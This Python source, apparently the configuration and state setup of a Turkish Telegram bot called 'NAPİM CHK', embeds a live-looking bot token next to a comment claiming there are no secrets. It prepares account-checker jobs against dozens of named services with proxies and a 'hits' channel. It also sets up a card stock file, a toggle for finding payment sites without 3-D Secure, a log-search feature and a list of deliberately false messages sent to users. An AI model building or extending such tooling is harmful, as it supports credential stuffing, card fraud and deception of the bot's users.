import telebot
from telebot import types
import time
import random
import string
import uuid
import json
import requests
import base64
import os
import sys
import logging
import threading
import re
from datetime import datetime, timedelta
from logging.handlers import RotatingFileHandler

CONFIG_FILE = "config.json"
DEFAULT_CONFIG = {
  # Gerçek değerleri config.json veya ortam değişkenine yaz — burada gizli bilgi yok.
  "TOKEN": "8849504334:AAFdhT7VqkoWr_NXyVUvv61BkligwbgSKFw",
  "DEFAULT_ADMINS": [8295696730],
  "CHANNEL_USERNAME": "",
  "CHANNEL_LINK": "",
  "CHAT_USERNAME": "",
  "CHAT_LINK": "",
  "CHANNEL_ID": None,
  "CHAT_ID": None,
  "CHANNEL_BONUS": 30.0,
  "DAILY_BONUS_AMOUNT": 5.0,
  "JACKPOT_PERCENT": 0.01,
  "JACKPOT_CHANCE": 0.02,
  "MIN_WITHDRAW": 20.0,
  "WITHDRAW_COMMISSION": 0.05,
  "USDT_RATE": 34.5,
  "BACKUP_HOUR": 3,
  "MSG_SPAM_LIMIT": 15,
  "MSG_SPAM_TIME": 3,
  "CB_SPAM_LIMIT": 25,
  "CB_SPAM_TIME": 2,
  "TEMP_BAN_DURATION": 600,
  "AI_API_KEY": "",
  "AI_BASE_URL": "https://api.groq.com/openai/v1",
  "AI_MODEL": "openai/gpt-oss-120b",
  "AI_MAX_HISTORY": 12,
  "SMM_API_URL": "",
  "SMM_API_KEY": "",
  "SMM_MARKUP": 1.5,
  "SMM_USD_TRY": 34.5,
  "SMM_ENABLED": False,
  "HIT_CHANNEL_LINK": "",
  "HIT_CHANNEL_USERNAME": "",
  "HIT_CHANNEL_ID": None,
  "STAR_RECEIVER_ID": 0,
  "STAR_RECEIVER_USERNAME": "",
  "GROUP_OWNER_ID": 0,
  "BOT_BRAND": "NAPİM CHK",
}

# Opsiyonel: ortamda base64 gizli (ornek). Düz metin token ASLA koda yazma.
def _b64(s):
  try:
    import base64 as _b
    return _b.b64decode((s or "").encode("ascii")).decode("utf-8").strip()
  except Exception:
    return ""

def load_config():
  if not os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
      json.dump(DEFAULT_CONFIG, f, ensure_ascii=False, indent=4)
    return dict(DEFAULT_CONFIG)
  try:
    with open(CONFIG_FILE, "r", encoding="utf-8") as f:
      cfg = json.load(f)
    for k, v in DEFAULT_CONFIG.items():
      if k not in cfg:
        cfg[k] = v
    return cfg
  except Exception as e:
    print(f"Config yüklenemedi, varsayılan kullanılıyor: {e}")
    return dict(DEFAULT_CONFIG)

CONFIG = load_config()
try:
  import argparse as _argparse
  _ap = _argparse.ArgumentParser(add_help=False)
  _ap.add_argument("--token", default=None)
  _ap.add_argument("--db", default=None)
  _ap.add_argument("--owner", default=None)
  _cli, _ = _ap.parse_known_args()
except Exception:
  _cli = type("C", (), {"token": None, "db": None, "owner": None})()
TOKEN = (_cli.token or os.environ.get("BOT_TOKEN") or CONFIG.get("TOKEN") or _b64(os.environ.get("BOT_TOKEN_B64", "")) or "").strip()
if _cli.db:
  os.environ["CC_DB_OVERRIDE"] = str(_cli.db)
if _cli.owner:
  os.environ["CC_BOT_OWNER"] = str(_cli.owner)
DEFAULT_ADMINS = list(CONFIG.get("DEFAULT_ADMINS") or [])
try:
  for _a in (os.environ.get("BOT_ADMINS") or "").replace(";", ",").split(","):
    _a = (_a or "").strip()
    if _a.lstrip("-").isdigit():
      DEFAULT_ADMINS.append(int(_a))
  DEFAULT_ADMINS = list(dict.fromkeys(int(x) for x in DEFAULT_ADMINS))
except Exception:
  DEFAULT_ADMINS = list(CONFIG.get("DEFAULT_ADMINS") or [])
CHAT_V2_URL = (CONFIG.get("CHAT_V2_URL") or os.environ.get("CHAT_V2_URL") or "").strip()
KUMAR_V2_URL = (CONFIG.get("KUMAR_V2_URL") or os.environ.get("KUMAR_V2_URL") or "https://apoci.tiiny.site").strip()
BOT_BRAND = (os.environ.get("CC_BOT_BRAND") or CONFIG.get("BOT_BRAND") or "NAPİM CHK").strip()
NAPIM_MEMORY_LINE = (CONFIG.get("NAPIM_MEMORY_LINE") or os.environ.get("NAPIM_MEMORY_LINE") or "🕊️ NAPİM anısına — emeğe saygı.").strip()
LOCKED_ADMIN_IDS = set(int(x) for x in DEFAULT_ADMINS)
try:
  for _x in (os.environ.get("CC_LOCKED_ADMINS") or "").split(","):
    _x = (_x or "").strip()
    if _x:
      LOCKED_ADMIN_IDS.add(int(_x))
except Exception:
  pass
CHANNEL_USERNAME = CONFIG["CHANNEL_USERNAME"]
CHANNEL_LINK = CONFIG["CHANNEL_LINK"]
CHAT_USERNAME = CONFIG.get("CHAT_USERNAME") or ""
CHAT_LINK = CONFIG.get("CHAT_LINK") or ""
CHANNEL_ID = CONFIG.get("CHANNEL_ID")  # örn -100xxxxxxxxxx
CHAT_ID = CONFIG.get("CHAT_ID")        # örn -100xxxxxxxxxx (username bozulunca bunu kullan)
if not CHAT_ID:
  CHAT_ID = None
CHANNEL_BONUS = float(CONFIG["CHANNEL_BONUS"])
HIT_CHANNEL_LINK = (CONFIG.get("HIT_CHANNEL_LINK") or "").strip()
HIT_CHANNEL_USERNAME = (CONFIG.get("HIT_CHANNEL_USERNAME") or "").strip()
HIT_CHANNEL_ID = CONFIG.get("HIT_CHANNEL_ID")  # -100... veya None
AI_API_KEY = (CONFIG.get("AI_API_KEY") or os.environ.get("AI_API_KEY") or "").strip()
AI_BASE_URL = (CONFIG.get("AI_BASE_URL") or "https://api.groq.com/openai/v1").rstrip("/")
AI_MODEL = CONFIG.get("AI_MODEL") or "openai/gpt-oss-120b"
AI_MAX_HISTORY = int(CONFIG.get("AI_MAX_HISTORY") or 12)
SMM_API_URL = (CONFIG.get("SMM_API_URL") or "").rstrip("/")
SMM_API_KEY = (CONFIG.get("SMM_API_KEY") or "").strip()
SMM_MARKUP = float(CONFIG.get("SMM_MARKUP") or 1.5)
SMM_USD_TRY = float(CONFIG.get("SMM_USD_TRY") or CONFIG.get("USDT_RATE") or 34.5)
SMM_ENABLED = False  # SMM paneli kaldırıldı
BOT_BUILD_TAG = "v2026-08-24-noSMM"
try:
  _BASE_DIR = os.path.dirname(os.path.abspath(__file__))
except Exception:
  _BASE_DIR = os.getcwd()

def _db_score(fp):
  """En dolu database.json'u seçmek için skor (kullanıcı sayısı + boyut)."""
  try:
    if not os.path.isfile(fp):
      return -1
    sz = os.path.getsize(fp)
    if sz < 20:
      return 0
    with open(fp, "r", encoding="utf-8") as f:
      data = json.load(f)
    if not isinstance(data, dict):
      return 0
    n_users = len(data.get("registered_users") or [])
    n_bal = len(data.get("user_balances") or {})
    n_cred = len(data.get("user_credentials") or {})
    return n_users * 1000 + n_bal * 100 + n_cred * 50 + min(sz // 1024, 5000)
  except Exception:
    try:
      return max(0, os.path.getsize(fp) // 1024)
    except Exception:
      return -1

def _discover_db_file():
  """
  Script klasörü, çalışma dizini ve yedeklerde en dolu database.json'u bul.
  Boş yeni dosya yüzünden eski bakiyelerin kaybolmasını engeller.
  """
  candidates = []
  seen = set()

  def add(p):
    try:
      p = os.path.abspath(p)
    except Exception:
      return
    if p in seen:
      return
    seen.add(p)
    if os.path.isfile(p):
      candidates.append(p)

  for base in (_BASE_DIR, os.getcwd()):
    add(os.path.join(base, "database.json"))
    for bdir in ("db_backups", "backups"):
      d = os.path.join(base, bdir)
      try:
        if os.path.isdir(d):
          for name in os.listdir(d):
            if name.startswith("database") and name.endswith(".json"):
              add(os.path.join(d, name))
      except Exception:
        pass
    for alt in ("database.json.bak", "database.json.old", "database_old.json"):
      add(os.path.join(base, alt))

  for extra in (
    "/storage/emulated/0/Recordings/database.json",
    "/storage/emulated/0/Download/database.json",
    "/sdcard/Recordings/database.json",
    "/sdcard/Download/database.json",
  ):
    add(extra)
    try:
      parent = os.path.dirname(extra)
      for bdir in ("db_backups", "backups"):
        d = os.path.join(parent, bdir)
        if os.path.isdir(d):
          for name in os.listdir(d):
            if name.startswith("database") and name.endswith(".json"):
              add(os.path.join(d, name))
    except Exception:
      pass

  if not candidates:
    return os.path.join(_BASE_DIR, "database.json"), _BASE_DIR

  best = max(candidates, key=_db_score)
  best_score = _db_score(best)
  primary = os.path.join(_BASE_DIR, "database.json")
  primary_score = _db_score(primary) if os.path.isfile(primary) else -1

  if best_score > primary_score and best_score >= 100:
    try:
      if os.path.abspath(best) != os.path.abspath(primary):
        import shutil
        os.makedirs(os.path.dirname(primary) or ".", exist_ok=True)
        shutil.copy2(best, primary)
        print(f"♻️ Eski DB bulundu ve geri yüklendi:\n   kaynak: {best}\n   hedef:  {primary}\n   skor:   {best_score}")
        return primary, _BASE_DIR
    except Exception as e:
      print(f"⚠️ DB kopyalanamadı ({e}), doğrudan kaynak kullanılacak: {best}")
      return best, os.path.dirname(best) or _BASE_DIR

  return primary, _BASE_DIR

DB_FILE, _BASE_DIR = _discover_db_file()
if os.environ.get("CC_DB_OVERRIDE"):
  DB_FILE = os.environ["CC_DB_OVERRIDE"]
  print(f"📁 DB override: {DB_FILE}")
DB_BACKUP_DIR = os.path.join(_BASE_DIR, "db_backups")
_DB_LOAD_OK = False  # True olunca save serbest; load fail ise boş overwrite engellenir

ERROR_LOG_FILE = "errors.log"
URLS_LOG_FILE = "urls.txt"
MAX_URLS_LOG_BYTES = None  # None = limitsiz
MAX_UPLOAD_LOG_BYTES = 20 * 1024 * 1024       # Telegram pratik üst sınır ~20 MB
LOG_INBOX_DIR = "log_inbox"
LOG_SHARDS_DIR = "log_shards"  # domain bazlı hızlı arama
LOG_INBOX_DONE_DIR = os.path.join(LOG_INBOX_DIR, "done")
LOG_FREE_LIMIT = 999999  # log ücretsiz (eski alan uyumluluk)
LOG_SEARCH_COST = 0.0    # log ücretsiz
LOG_COOLDOWN_SEC = 180   # her log araması arası 3 dakika
log_search_used = {}  # eski alan (kullanılmıyor, uyumluluk)
log_search_last = {}  # {user_id: unix_ts} son log araması
user_bot_tokens = {}  # {user_id: {"token": str, "username": str, "bot_id": int}}
child_bot_procs = {}  # {user_id: pid} bu processten acilan alt botlar

confessions = []  # [{id, text, time, hidden}]  author saklanmaz kullaniciya; admin icin _uid
confession_meta = {}  # {cid: user_id} sadece admin silme / moderasyon
daily_question = {"q": "", "opts": [], "votes": {}, "active": False}  # votes: {user_id: opt_idx}
giveaways = {}  # {gid: {title, prize, cost, entrants: [], active, winner}}
wheel_last = {}  # {user_id: date_str}
blackhole_pot = 0.0
blackhole_players = []  # user ids this round
shadow_banned = set()  # yavaslatma
stock_prices = {}  # coin -> TRY price (cache)
stock_portfolio = {}  # {user_id: {sym: float_amount}}
stock_last_tick = 0.0
CRYPTO_FEE = 0.01  # %1 komisyon
CRYPTO_COINS = {
  "BTC": "bitcoin",
  "ETH": "ethereum",
  "SOL": "solana",
  "XRP": "ripple",
  "DOGE": "dogecoin",
  "BNB": "binancecoin",
}
crypto_pending = {}  # {chat_id: {"side": buy/sell, "sym": "BTC"}}
quiz_active = {}  # {user_id: {"q":..., "ans":..., "t": unix, "msg_id":...}}
HORSE_NAMES = ["Şimşek", "Rüzgar", "Kartal", "Yıldız", "Asil", "Fırtına"]

GROUP_GUARD_ENABLED = True
GROUP_OWNER_ID = int(CONFIG.get("GROUP_OWNER_ID") or (DEFAULT_ADMINS[0] if DEFAULT_ADMINS else 0) or 0)
GUARD_CHAT_IDS = set()
_gc = CONFIG.get("GUARD_CHAT_IDS") or os.environ.get("GUARD_CHAT_IDS") or ""
if isinstance(_gc, list):
  for x in _gc:
    try:
      GUARD_CHAT_IDS.add(int(x))
    except Exception:
      pass
elif isinstance(_gc, str) and _gc.strip():
  for x in _gc.replace(";", ",").split(","):
    x = x.strip()
    if x.lstrip("-").isdigit():
      GUARD_CHAT_IDS.add(int(x))
admin_ban_strikes = {}  # {admin_id: count}
member_warns = {}  # {f"{chat_id}:{user_id}": count}
member_mute_until = {}  # {f"{chat_id}:{user_id}": unix}
SWEAR_MUTE_SEC = 300  # 5 dk (10 uyaridan sonra)
SWEAR_WARN_LIMIT = 10  # kac uyari sonra mute
ADMIN_BAN_LIMIT = 3  # 3 ban sonrasi uyari, 4. de yetki al + ban

# --- Grup/Kanal koruma (CC + video burst) ---
GUARD_CC_ENABLED = True
GUARD_VIDEO_BURST_ENABLED = True
GUARD_VIDEO_BURST_LIMIT = 10
GUARD_VIDEO_BURST_WINDOW = 120
GUARD_AUTO_LOCK_ON_SEVERE = True
video_burst_tracker = {}
group_msg_log = {}
GROUP_MSG_LOG_MAX = 80

CHANNEL_DROP_INTERVAL = 900  # 15 dk
CHANNEL_DROP_REWARD = 10.0
TOP_MSG_REWARD = 100.0
channel_drop_active = {}  # {code: {"claimed": bool, "msg_id": int, "chat_id": int}}
channel_gate_last = {}  # {user_id: unix} spam engeli
channel_drop_last_msg = {}  # {chat_id: msg_id} onceki drop silinsin
chat_msg_counts = {}  # {user_id: int} gunluk
chat_msg_day = ""  # YYYY-MM-DD
last_top_award_day = ""  # odul verilen gun
BOT_USERNAME = None  # getMe ile

# --- Gece modu / Yalanlar / Günlük kanal çekilişi ---
NIGHT_START_HOUR = 0   # 00:00
NIGHT_END_HOUR = 6     # 06:00 (hariç)
NIGHT_JACKPOT_MULT = 2.5
CEKILIS_MIN_PLAYERS = 30
CEKILIS_MIN_PRIZE = 500.0
CEKILIS_MAX_PRIZE = 2000.0
CEKILIS_REMIND_SEC = 1800  # 30 dk (spam azaltıldı)
CEKILIS_GIVE_SUB = True   # kazanan 1 gün checker aboneliği de alsın
CEKILIS_SUB_PLAN = "1d"
daily_cekilis = {
  "active": False,
  "prize": 0.0,
  "entrants": [],
  "started_at": 0.0,
  "day": "",
  "channel_msg_id": None,
  "last_remind": 0.0,
  "winner": None,
  "give_sub": True,
}
user_night_badges = set()  # gece kuşu rozeti alanlar
FAKE_LIES = [
  "Bugün **{n}** kişi seni kıskandı. Hiçbiri adını bilmiyor ama hissediyorlar.",
  "Son 1 saatte profiline **{n}** kişi baktı. Biri uzun süre kaldı.",
  "Bakiyen gizli servis tarafından **{n}** kez incelendi. Temiz çıktın.",
  "Kanalda **{n}** kişi senin mesajını beğenmeden kaydırdı. Onlar kaybetti.",
  "Şans seviyen bugün **%{n}**. Bu sayı tamamen uydurma ama iyi duruyor.",
  "Bir admin seni **{n}** saniye düşündü, sonra vazgeçti.",
  "Jackpot seni **{n}** kez neredeyse vuracaktı. Neredeyse sayılmaz.",
  "Referans linkin **{n}** kez kopyalandı, **0** kez kullanıldı. Klasik.",
  "Bot senin için **{n}** satır log tuttu. Çoğu boş.",
  "Gece yarısı **{n}** hayalet hesap adını fısıldadı. Uydurma.",
  "Checker'ın **{n}** satır daha hızlı çalışabilirdi. Tembellik.",
  "Bugün **{n}** kişi seninle aynı saatte online oldu. Kader.",
  "Cüzdanın **{n}** TL daha dolu görünüyor… ama değil. Göz yanılması.",
  "Bir çekilişte **{n}. sıradaydın**. Kazanan olmadın, dramatiktin.",
  "Bot seni **{n}** kez 'vip' sanıp sonra düzeltti.",
]

_SWEAR_RE = None
def _swear_pattern():
  global _SWEAR_RE
  if _SWEAR_RE is not None:
    return _SWEAR_RE
  import re
  words = [
    r"allah.?ın[ai].?sok", r"allahini", r"allahını", r"allahina",
    r"anneni", r"anani", r"ananı", r"anasini", r"anasını",
    r"bacini", r"bacını", r"bacına", r"bacına",
    r"orospu", r"sikerim", r"sikeyim",
    r"yarrak", r"piç", r"götün", r"gotun",
  ]
  _SWEAR_RE = re.compile("|".join(words), re.IGNORECASE)
  return _SWEAR_RE

def _guard_key(chat_id, user_id):
  return f"{chat_id}:{user_id}"

def _guard_applies(chat_id):
  if not GROUP_GUARD_ENABLED:
    return False
  if chat_id and chat_id > 0:
    return False  # private
  if GUARD_CHAT_IDS:
    return int(chat_id) in GUARD_CHAT_IDS
  return True  # tum gruplar

def _notify_owner(text_msg):
  oid = GROUP_OWNER_ID
  if not oid:
    return
  try:
    bot.send_message(oid, text_msg, parse_mode="Markdown")
  except Exception:
    try:
      bot.send_message(oid, text_msg)
    except Exception:
      pass

def group_mute_user(chat_id, user_id, seconds=SWEAR_MUTE_SEC):
  until = int(time.time()) + int(seconds)
  try:
    bot.restrict_chat_member(
      chat_id,
      user_id,
      until_date=until,
      can_send_messages=False,
      can_send_media_messages=False,
      can_send_other_messages=False,
      can_add_web_page_previews=False,
    )
    member_mute_until[_guard_key(chat_id, user_id)] = until
    return True
  except Exception as e:
    log_error("group_mute", e)
    return False

def group_ban_user(chat_id, user_id):
  try:
    bot.ban_chat_member(chat_id, user_id)
    return True
  except Exception as e:
    log_error("group_ban", e)
    return False

def group_demote_admin(chat_id, user_id):
  try:
    bot.promote_chat_member(
      chat_id, user_id,
      can_change_info=False, can_delete_messages=False,
      can_invite_users=False, can_restrict_members=False,
      can_pin_messages=False, can_promote_members=False,
      is_anonymous=False, can_manage_chat=False,
      can_manage_video_chats=False,
    )
    return True
  except Exception as e:
    log_error("group_demote", e)
    return False

def group_lock_chat(chat_id):
  try:
    bot.set_chat_permissions(
      chat_id,
      can_send_messages=False,
      can_send_media_messages=False,
      can_send_other_messages=False,
      can_add_web_page_previews=False,
      can_invite_users=True,
    )
    return True
  except Exception as e:
    log_error("group_lock", e)
    return False

def group_unlock_chat(chat_id):
  try:
    bot.set_chat_permissions(
      chat_id,
      can_send_messages=True,
      can_send_media_messages=True,
      can_send_other_messages=True,
      can_add_web_page_previews=True,
      can_invite_users=True,
    )
    return True
  except Exception as e:
    log_error("group_unlock", e)
    return False

def _luhn_ok(num):
  digits = [int(c) for c in num if c.isdigit()]
  if len(digits) < 13 or len(digits) > 19:
    return False
  s, parity = 0, len(digits) % 2
  for i, d in enumerate(digits):
    if i % 2 == parity:
      d *= 2
      if d > 9:
        d -= 9
    s += d
  return s % 10 == 0

def message_contains_cc(text):
  if not text:
    return False
  if re.search(r"\b(?:fullz?|cvv\s*live|cc\s*dump|card\s*dump|bin\s*list)\b", text, re.I):
    return True
  if re.search(r"\b\d{15,16}\s*[|/:]\s*\d{1,2}\s*[|/:]\s*\d{2,4}\s*[|/:]\s*\d{3,4}\b", text):
    return True
  for m in re.finditer(r"(?:\d[ -]*?){13,19}", text):
    raw = re.sub(r"\D", "", m.group(0))
    if _luhn_ok(raw):
      return True
  return False

def _message_is_video_like(message):
  if getattr(message, "video", None) or getattr(message, "video_note", None) or getattr(message, "animation", None):
    return True
  doc = getattr(message, "document", None)
  if doc and (getattr(doc, "mime_type", None) or "").startswith("video/"):
    return True
  return False

def _guard_log_message(chat_id, user_id, message_id):
  try:
    d = group_msg_log.setdefault(int(chat_id), {})
    lst = d.setdefault(int(user_id), [])
    lst.append(int(message_id))
    if len(lst) > GROUP_MSG_LOG_MAX:
      del lst[: len(lst) - GROUP_MSG_LOG_MAX]
  except Exception:
    pass

def _guard_purge_user_messages(chat_id, user_id):
  try:
    ids = list((group_msg_log.get(int(chat_id)) or {}).get(int(user_id)) or [])
  except Exception:
    ids = []
  for mid in ids:
    try:
      bot.delete_message(chat_id, mid)
    except Exception:
      pass
  try:
    if int(chat_id) in group_msg_log:
      group_msg_log[int(chat_id)].pop(int(user_id), None)
  except Exception:
    pass

def _register_video_burst(chat_id, user_id):
  now = time.time()
  d = video_burst_tracker.setdefault(int(chat_id), {})
  hits = d.setdefault(int(user_id), [])
  hits.append(now)
  cutoff = now - float(GUARD_VIDEO_BURST_WINDOW)
  while hits and hits[0] < cutoff:
    hits.pop(0)
  return len(hits)

def _clear_video_burst(chat_id, user_id):
  try:
    video_burst_tracker.get(int(chat_id), {}).pop(int(user_id), None)
  except Exception:
    pass

def punish_video_burst(chat_id, user_id, username=""):
  uname = username or str(user_id)
  _guard_purge_user_messages(chat_id, user_id)
  demoted = group_demote_admin(chat_id, user_id)
  banned = group_ban_user(chat_id, user_id)
  muted = False
  if not banned:
    muted = group_mute_user(chat_id, user_id, seconds=10 * 365 * 24 * 3600)
  _clear_video_burst(chat_id, user_id)
  parts = []
  if demoted:
    parts.append("yetki alindi")
  if banned:
    parts.append("ban")
  elif muted:
    parts.append("mute")
  parts.append("mesajlar silindi")
  detail = ", ".join(parts)
  try:
    bot.send_message(
      chat_id,
      f"🚫 **Video burst**\n`{uname}` (`{user_id}`) kisa surede cok video atti.\nIslem: **{detail}**",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  if GUARD_AUTO_LOCK_ON_SEVERE:
    try:
      if group_lock_chat(chat_id):
        bot.send_message(chat_id, "🔒 Agir ihlal — grup kilitlendi.", parse_mode="Markdown")
    except Exception:
      pass
  try:
    _notify_owner(f"🚫 Video burst chat={chat_id} user={user_id} {uname} -> {detail}")
  except Exception:
    pass
  return banned or muted

def punish_cc_dump(chat_id, user_id, username="", message_id=None):
  uname = username or str(user_id)
  if message_id:
    try:
      bot.delete_message(chat_id, message_id)
    except Exception:
      pass
  _guard_purge_user_messages(chat_id, user_id)
  group_demote_admin(chat_id, user_id)
  banned = group_ban_user(chat_id, user_id)
  if not banned:
    group_mute_user(chat_id, user_id, seconds=10 * 365 * 24 * 3600)
  try:
    bot.send_message(
      chat_id,
      f"💳 **CC / kart dump engellendi**\n`{uname}` (`{user_id}`)",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  if GUARD_AUTO_LOCK_ON_SEVERE:
    try:
      group_lock_chat(chat_id)
    except Exception:
      pass
  try:
    _notify_owner(f"💳 CC dump chat={chat_id} user={user_id} {uname}")
  except Exception:
    pass

reminders = []  # [{uid, chat_id, text, at}]
text_tool_state = {}
duel_waiting = {}  # {user_id: bet}
trade_offers = {}  # {tid: {from, to, amount, status}}

_log_handler = RotatingFileHandler(ERROR_LOG_FILE, maxBytes=2_000_000, backupCount=5, encoding="utf-8")
_log_handler.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger = logging.getLogger("napim_bot")
logger.setLevel(logging.INFO)
if not logger.handlers:
  logger.addHandler(_log_handler)
  logger.addHandler(logging.StreamHandler(sys.stdout))

def log_error(msg, exc=None):
  if exc:
    logger.exception("%s | %s", msg, exc)
  else:
    logger.error(msg)

def safe_tg(fn, *args, retries=1, **kwargs):
  """Telegram API — 429/403/Markdown hatalarını yut, botu kilitleme."""
  last_err = None
  for attempt in range(max(1, retries) + 1):
    try:
      return fn(*args, **kwargs)
    except Exception as e:
      last_err = e
      msg = str(e).lower()
      if "403" in msg or "bot was blocked" in msg or "user is deactivated" in msg:
        return None
      if "forbidden" in msg and ("blocked" in msg or "deactivated" in msg or "can't initiate" in msg):
        return None
      # Aynı içerikle edit → Telegram 400 "message is not modified" (zararsız, log spam olmasın)
      if "message is not modified" in msg or "message_not_modified" in msg:
        return True
      if "can't parse entities" in msg or "parse entities" in msg or ("bad request" in msg and "entity" in msg):
        kw2 = dict(kwargs)
        kw2.pop("parse_mode", None)
        try:
          return fn(*args, **kw2)
        except Exception as e2:
          last_err = e2
          try:
            if len(args) >= 2 and isinstance(args[1], str):
              plain = re.sub(r"[*_`\[\]]", "", args[1])
              a2 = list(args)
              a2[1] = plain
              return fn(*a2, **kw2)
            if "text" in kw2 and isinstance(kw2["text"], str):
              kw2["text"] = re.sub(r"[*_`\[\]]", "", kw2["text"])
              return fn(*args, **kw2)
            if "caption" in kw2 and isinstance(kw2["caption"], str):
              kw2["caption"] = re.sub(r"[*_`\[\]]", "", kw2["caption"])
              return fn(*args, **kw2)
          except Exception:
            pass
          return None
      wait = 0
      if "too many requests" in msg or "retry after" in msg or "429" in msg:
        m2 = re.search(r"retry after[\s:]*([0-9]+)", str(e), re.I)
        raw = int(m2.group(1)) if m2 else 5
        if raw > 60:
          log_error(f"safe_tg_FLOOD_BAN retry_after={raw}s fn={getattr(fn, '__name__', fn)}")
          return None
        wait = min(raw, 20)
      elif "flood" in msg:
        wait = min(3 * (attempt + 1), 15)
      elif "timed out" in msg or "timeout" in msg:
        wait = min(3 * (attempt + 1), 12)
      else:
        wait = 1
      if attempt < retries and wait > 0:
        try:
          time.sleep(wait)
        except Exception:
          pass
        continue
      if "403" not in msg and "blocked" not in msg and "deactivated" not in msg:
        try:
          logger.warning("safe_tg fail %s | %s", getattr(fn, "__name__", fn), str(e)[:160])
        except Exception:
          pass
      return None
  return None

def _patch_bot_api_safe():
  """bot.send_* / edit_* / answer_callback asla 429 ile crash etmesin."""
  global bot
  if getattr(bot, "_safe_patched", False):
    return
  for name in ("send_message", "edit_message_text", "edit_message_reply_markup",
         "send_document", "send_photo", "send_video", "send_audio",
         "answer_callback_query", "delete_message", "send_chat_action"):
    if not hasattr(bot, name):
      continue
    orig = getattr(bot, name)
    def _make(o, n):
      def _wrapped(*a, **k):
        return safe_tg(o, *a, retries=1, **k)
      _wrapped.__name__ = n
      return _wrapped
    setattr(bot, name, _make(orig, name))
  bot._safe_patched = True

STOCK_FILE_CVV = "cvvsiz_stock.txt"

if not TOKEN:
  print("⚠️ TOKEN yok. config.json → TOKEN veya ortam BOT_TOKEN ayarla.")
bot = telebot.TeleBot(TOKEN or "0:invalid", parse_mode=None, threaded=True, num_threads=4)
_patch_bot_api_safe()
try:
  import telebot.apihelper as _apihelper
  _apihelper.CONNECT_TIMEOUT = 60
  _apihelper.READ_TIMEOUT = 90
  try:
    _apihelper.RETRY_ON_ERROR = True
  except Exception:
    pass
except Exception as _e:
  print("apihelper timeout ayarı atlandı:", _e)
user_states = {}
admin_temp_data = {}
active_auto_slots = {}  # {chat_id: True/False}
active_mines_games = {}
okey_queue = []  # [user_id, ...]
okey_rooms = {}  # {code: {"p1": id, "p2": id|None, "bet": float, "status": str}}
active_zeplin_games = {} # {user_id: {'bet': float, 'multiplier': float, 'game_over': bool, 'crash_at': float}}
active_cpm_jobs = {}
active_cpmv2_jobs = {}
active_n11_jobs = {}  # {user_id: job dict}
active_s2gepin_jobs = {}  # {user_id: job dict}
active_penti_jobs = {}  # {user_id: job dict}
active_candy_jobs = {}  # {user_id: job dict}
active_kurumedy_jobs = {}  # {user_id: job dict}
active_smmturk_jobs = {}  # {user_id: job dict}
active_smpanel_jobs = {}  # {user_id: job dict}
active_worldofsmm_jobs = {}  # {user_id: job dict}
active_jap_jobs = {}  # {user_id: job dict}
active_vpazari_jobs = {}  # {user_id: job dict}
active_predunyam_jobs = {}
active_mackolik_jobs = {}
active_ozygame_jobs = {}
active_capcut_jobs = {}
active_verisunucu_jobs = {}
active_smsonay_jobs = {}
active_buraksmsonay_jobs = {}
active_fenix_jobs = {}
active_ezglobal_jobs = {}
active_epinfy_jobs = {}
active_spotify_jobs = {}
active_snapchat_jobs = {}
active_medyabayim_jobs = {}
active_bkm_jobs = {}
active_barlas_jobs = {}
active_idefix_jobs = {}
active_oyuncustore_jobs = {}
active_oyundinar_jobs = {}
active_smsonaycom_jobs = {}
active_todtv_jobs = {}
active_bein_jobs = {}
active_ssport_jobs = {}
active_tabii_jobs = {}
active_crunchyroll_jobs = {}
user_checker_proxies = {}  # {user_id: [proxy_url]}
user_checker_workers = {}  # {user_id: int 2..8} son seçilen checker hızı
CHECKER_SPEED_MIN = 2
CHECKER_SPEED_MAX = 8
CHECKER_SPEED_DEFAULT = 4
checker_queues = {}
user_quiet_mode = {}  # {user_id: bool}
season_data = {
  "active": False,
  "title": "",
  "start": 0.0,
  "end": 0.0,
  "goals": {"hits": 50, "checks": 500, "refs": 3},
  "progress": {},  # {uid: {"hits","checks","refs"}}
  "claimed": {},   # {uid: True}
  "reward": 100.0,
}
suspicion_scores = {}
SUSPICION_ALERT_THRESHOLD = 40

smm_orders = {}  # {order_local_id: {...}}
smm_services_cache = {"ts": 0, "data": []}  # panel services cache

ai_sessions = {}
active_ai_chat = set()
user_temp_mails = {}
TEMPMAIL_STAR_COST = 3  # her yeni mail = 3 yıldız
MYBOT_STAR_COST = 50  # kendi bot bağlama (yıldız)
TELZ_MAX_NUMBERS = 20      # tek seferde max numara
TELZ_MAX_TIMES = 20        # kullanıcı: max kaç kere gönderim (admin sınırsız)
active_live_chat_users = set() # Anonim Canlı Sohbet Odasındaki Kullanıcılar
live_chat_realname = set()  # Gerçek isimle yazmak isteyenler (chat_id)
GAMBLE_CONVERT_COST = 50.0
GAMBLE_CONVERT_REWARD = 3.0  # ~eski oran (1000→60)
GAMBLE_CONVERT_MAX = 3
GAMBLE_CONVERT_WINDOW = 12 * 3600  # 12 saat
gamble_convert_uses = {}  # {user_id: {'count': int, 'window_start': float}}
BLASPHEMY_KEYWORDS = [
  "allahın am", "allahin am", "allahın sik", "allahin sik",
  "allahını", "allahini", "allahını sik", "allahini sik",
  "amına koyayım allah", "amina koyayim allah",
  "sikeyim allah", "sikim allah", "allah kerhan", "allah orospu",
  "peygamber sik", "muhammed sik", "hz muhammed", "dinini sik",
  "dininin am", "kitabını sik", "kuranı sik", "kuran sik",
]

daily_bonus_claims = {}   # {user_id: "YYYY-MM-DD"}
jackpot_pool = 0.0        # Ortak jackpot havuzu
tournament_week_start = None  # Turnuva haftası başlangıç timestamp
maintenance_mode = False  # Bakım modu
maintenance_until = None  # timestamp (float) — süreli bakım bitiş zamanı; None = süresiz/kapalı
feature_3dsiz_enabled = True  # 3D'siz Site Bul özelliği (admin aç/kapa)
feature_telz_enabled = False  # Telz Call — False = bakımda
callback_request_times = {}  # Callback spam ayrı takip
MSG_SPAM_LIMIT = int(CONFIG["MSG_SPAM_LIMIT"])
MSG_SPAM_TIME = int(CONFIG["MSG_SPAM_TIME"])
CB_SPAM_LIMIT = int(CONFIG["CB_SPAM_LIMIT"])
CB_SPAM_TIME = int(CONFIG["CB_SPAM_TIME"])
TEMP_BAN_DURATION = int(CONFIG.get("TEMP_BAN_DURATION", 600))
DAILY_BONUS_AMOUNT = float(CONFIG["DAILY_BONUS_AMOUNT"])
JACKPOT_PERCENT = float(CONFIG["JACKPOT_PERCENT"])
